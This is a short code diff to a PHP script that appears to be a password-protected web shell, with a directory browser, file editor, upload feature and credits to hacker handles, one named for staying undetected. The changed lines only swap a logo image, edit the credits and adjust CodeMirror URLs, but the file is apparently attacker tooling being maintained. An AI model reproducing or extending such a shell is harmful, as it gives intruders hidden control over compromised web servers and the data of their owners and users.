@@ -9,7 +9,7 @@ $pw    = 'e5e32f8c9a2e843080f5176871e8cd32'; // md5 password default = gans
 $inDir = true;                             // true or false, to enable input dir
 $out   = 'exit;';                         // string, not login
 $enc   = true;                           // js must enabled, editor & upload not encoded
-$img   = 'https://github.com/milio48/patifosi/raw/master/patifosi.gif';
+$img   = 'https://media.giphy.com/media/XoxPRR71OevDzqllyt/giphy.gif';
 
 // variable
 $dirGet = $_GET['dir'];
@@ -48,7 +48,7 @@ if($md5 !== $pw){
 }
 
 // tq
-$w = array("milio48", "pescyte", "idbte4m", "javcode", "zerobyte", "idxSmg", "patiUndetektet", "date"=>"28 Mei 2018");
+$w = array("pescyte", "idbte4m", "javcode", "zerobyte", "idxSmg", "patiUndetektet", "date"=>"28 Mei 2018");
  // sorry for bad code //
 // just for fun       //
 
@@ -82,11 +82,11 @@ if($inDir){
 // codemirror library in mode=edit
 if($mode == edit){
   $codemirror = "
-  <script src='http://codemirror.net/lib/codemirror.js'></script>
-  <link rel='stylesheet' href='http://codemirror.net/lib/codemirror.css'>
-  <script src='http://codemirror.net/mode/javascript/javascript.js'></script>
-  <link rel='stylesheet' href='http://codemirror.net/theme/monokai.css'>
-  <script src='https://codemirror.net/addon/edit/matchbrackets.js'></script>
+  <script src='//codemirror.net/lib/codemirror.js'></script>
+  <link rel='stylesheet' href='//codemirror.net/lib/codemirror.css'>
+  <script src='//codemirror.net/mode/javascript/javascript.js'></script>
+  <link rel='stylesheet' href='//codemirror.net/theme/monokai.css'>
+  <script src='//codemirror.net/addon/edit/matchbrackets.js'></script>
   ";
 };
 
